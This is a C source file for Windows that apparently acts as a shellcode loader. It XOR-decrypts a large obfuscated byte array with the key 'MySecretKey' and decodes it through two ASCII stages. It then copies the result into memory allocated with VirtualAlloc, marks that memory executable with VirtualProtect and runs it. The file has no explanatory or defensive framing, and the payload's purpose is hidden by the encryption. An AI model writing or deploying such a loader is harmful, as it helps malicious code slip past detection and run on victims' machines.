#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>

void xor_decrypt(unsigned char *data, int data_len, const unsigned char *key, int key_len);
char* ascii_decode(const char *input, int length);

int main() {

    unsigned char encrypted_txt[] = {'|','I','a','E','S','K','\\','T','z','U','H','m','I','f','S','C','B','P','B','k','U','L','}','Y','c','Q','[','R','U','@','s','E','I','y','A','s','U','W','J','E','D','\x7F',']','Y','}','M','k','E','S','G','Q','T','{','Q','A','m','I','f','S','C','B','P','C','k','T','I','|','Y','c','P','P','R','U','A','z','E','I','y','@','s','U','Z','K','E','D','\x7F',']','Y','}','L','g','E','S','G','W','T','{','P','O','m','I','j',']','C','B','P','G','k','U','M','u','Y','c','P','R','R','U','@','s','E','I','x','O','s','U','Z','J','E','D','~','V','Y','}','L','c','E','S','F',']','T','{','\\','@','m','I','f','S','C','B','\\','L','k','U','L','~','Y','c','P','S','R','U','@','r','E','I','x','K','s','U','V','D','E','D','r',']','Y','}','L','f','E','S','G','U','T','{','P','I','m','I','f','S','C','B','Q','L','k','T','I','\x7F','Y',
                                     'c','\\','[','R','U','A','~','E','I','x','K','s','U','Z','E','E','D','~','U','Y','}','L','g','E','S','G','T','T','{','Q','@','m','H','c','W','C','C','U','F','k','U','@','z','Y','c','\\','Z','R','U','A','z','E','I','t','@','s','U','V','F','E','D','\x7F','\\','Y','}','L','f','E','S','K','\\','T','{','Q','A','m','I','f','U','C','B','P','D','k','U','@','t','Y','c','P','S','R','U','@','s','E','I','t','@','s','U','W','K','E','D','r','\\','Y','|','I','a','E','S','F',']','T','z','U','I','m','I','g',']','C','B','Q','M','k','U','@','t','Y','c','P','V','R','T','D','z','E','I','x','I','s','T','S','@','E','D','~','U','Y','}','L','`','E','S','G','U','T','{','P','J','m','I','f','P','C','B','P','B','k','U','@','u','Y','c','P','P','R','U','A','{','E','I','y','@','s','U','W','J','E','D','~','S','Y','}','@','k','E',
                                     'S','G','W','T','{','\\','N','m','I','f','T','C','B','\\','M','k','U','L','{','Y','c','\\','[','R','U','A','y','E','I','t','@','s','U','W','K','E','D','\x7F','\\','Y','}','L','f','E','S','G','S','T','z','U','H','m','I','f','T','C','B','P','F','k','U','L','{','Y','c','Q','[','R','U','@','r','E','H','}','I','s','U','W','K','E','D','~','V','Y','}','M','j','E','S','G','S','T','{','\\','A','m','I','f','V','C','B','P','C','k','U','L','}','Y','c','Q','[','R','U','@','s','E','I','y','@','s','T','S','B','E','D','~','T','Y','}','L','e','E','S','K',']','T','{','P','K','m','I','f','R','C','B','Q','M','k','U','L','{','Y','b','U','R','R','U','A','z','E','I','x','H','s','U','Z','E','E','D','~','W','Y','}','L','d','E','S','G','S','T','{','\\','A','m','I','f','T','C','B','P','F','k','U','L','{','Y','c','\\','[','R',
                                     'U','@','s','E','I','y','@','s','T','S','B','E','D','~','Q','Y','}','L','b','E','S','F','\\','T','z','U','K','m','H','c','W','C','B','\\','C','k','U','@','t','Y','c','\\','Z','R','U','@','r','E','I','t','@','s','T','S','@','E','D','\x7F',']','Y','|','I','c','E','S','F',']','T','{','Q','@','m','I','j','\\','C','B','P','A','k','U','L','|','Y','c','P','U','R','T','D','z','E','I','y','A','s','U','V','G','E','D','~','V','Y','|','I','a','E','S','G','Q','T','{','Q','A','m','I','f','T','C','B','P','A','k','T','I','}','Y','b','U','Q','R','U','A','}','E','I','x','H','s','U','Z','J','E','D','~','P','Y','|','I','c','E','S','G','U','T','{','P','K','m','I','f','P','C','B','P','G','k','T','I','|','Y','c','P','Q','R','U','A','x','E','I','x','O','s','U','V','D','E','D','r',']','Y','}','L','`','E','S','G','S','T',
                                     '{','P','I','m','I','f','W','C','B','Q','L','k','U','M','t','Y','b','U','S','R','U','A','z','E','I','x','M','s','U','V','F','E','D','~','S','Y','}','@','k','E','S','F',']','T','{','\\','@','m','I','f','W','C','B','\\','L','k','U','L','{','Y','c','\\','[','R','U','A','x','E','I','x','O','s','U','W','K','E','D','r','\\','Y','}','M','k','E','S','F','\\','T','z','U','I','m','I','f','T','C','B','P','B','k','U','@','u','Y','c','Q','[','R','U','A','y','E','I','x','O','s','U','Z','J','E','D','\x7F',']','Y','}','M','j','E','R','B','U','T','{','Q','A','m','I','f','S','C','B','P','C','k','U','L','\x7F','Y','c','P','Q','R','U','A','{','E','I','x','K','s','U','V','B','E','D','~','W','Y','}','L','`','E','S','K',']','T','{','P','J','m','I','j',']','C','B','P','@','k','U','M','t','Y','c','P','P','R','U','A','|','E',
                                     'I','x','J','s','U','Z','E','E','D','~','V','Y','}','M','j','E','R','B','W','T','z','U','K','m','H','c','T','C','B','Q','L','k','U','L','~','Y','b','U','Q','R','U','A','x','E','H','}','K','s','U','V','A','E','D','r','R','Y','}','L','e','E','S','K',']','T','{','Q','@','m','I','f','U','C','C','U','E','k','U','@','u','Y','c','P','U','R','T','D','{','E','I','x','J','s','T','S','B','E','D','~','Q','Y','}','@','d','E','S','F',']','T','{','Q','@','m','I','f','S','C','C','U','D','k','U','L','{','Y','c','P','P','R','U','M','s','E','I','x','I','s','U','W','J','E','D','\x7F',']','Y','}','M','k','E','S','F',']','T','{','Q','A','m','I','g',']','C','B','P','G','k','U','M','u','Y','c','P','W','R','U','A','}','E','I','x','H','s','U','W','K','E','D','~','S','Y','}','@','k','E','S','G','Q','T','z','U','K','m',
                                     'I','f','S','C','B','P','A','k','T','I','\x7F','Y','b','U','Q','R','T','D','{','E','I','x','J','s','U','Z','J','E','D','r',']','Y','|','I','a','E','S','F',']','T','{','\\','A','m','I','f','V','C','B','\\','C','k','U','L','}','Y','c','P','P','R','U','A','\x7F','E','I','x','M','s','U','V','D','E','D','r','R','Y','}','L','g','E','S','G','R','T','{','P','J','m','I','j',']','C','C','U','D','k','U','L','z','Y','b','U','S','R','T','D','y','E','H','}','K','s','T','S','B','E','D','~','V','Y','}','L','b','E','S','K','\\','T','{','Q','A','m','I','f','Q','C','B','P','A','k','U','@','t','Y','c','Q','[','R','U','M','|','E','I','x','O','s','U','W','J','E','E','{','W','Y','}','@','k','E','R','B','T','T','{','Q','A','m','I','f','P','C','B','P','G','k','U','M','u','Y','c','P','P','R','U','M','s','E','I','t','A','s',
                                     'U','V','@','E','D','~','P','Y','}','M','j','E','S','G','T','T','{','P','L','m','I','f','U','C','B','P','@','k','T','I','\x7F','Y','c','P','W','R','U','M','|','E','I','y','A','s','U','W','J','E','D','~','V','Y','}','L','b','E','R','B','W','T','z','U','K','m','H','c','U','C','B','P','G','k','U','L','y','Y','c','P','R','R','U','A','\x7F','E','I','y','@','s','U','V','F','E','D','r','\\','Y','}','L','g','E','S','G','T','T','{','P','I','m','H','c','T','C','B','P','@','k','U','L','~','Y','c','P','V','R','U','A','}','E','I','x','M','s','U','V','A','E','D','\x7F',']','Y','}','M','k','E'};

    char xor_key[] = "MySecretKey";

    unsigned int key_length = strlen(xor_key);    
    xor_decrypt(encrypted_txt, strlen(encrypted_txt), xor_key, key_length);
    unsigned int char_in_hex;

    char *shellcode=ascii_decode((const unsigned char *)encrypted_txt, strlen(encrypted_txt));
    unsigned int iterations=strlen(shellcode);   
    unsigned int memory_allocation = strlen(shellcode) / 2;
   
    for(unsigned int i = 0; i< iterations-1; i++) {
    
        sscanf(shellcode+2*i, "%2X", &char_in_hex);
        shellcode[i] = (char)char_in_hex;
    
    }

    void *exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, shellcode, memory_allocation);

    DWORD ignore;
    VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
    (*(void (*)()) exec)();
        
    return 0;

}

void xor_decrypt(unsigned char *data, int data_len, const unsigned char *key, int key_len) {
    for (int i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

char* ascii_decode(const char *input, int length) {

    int decoded_length = length / 4;

    unsigned char *output = (unsigned char *)malloc(decoded_length + 1);
    if (output == NULL) {
        fprintf(stderr, "Fuck.\n");
        exit(1);
    }

    for (int i = 0; i < decoded_length; i++) {
        sscanf(input + i * 4, "%3hhu ", &output[i]);
    }
    output[decoded_length] = '\0';

    return output;

}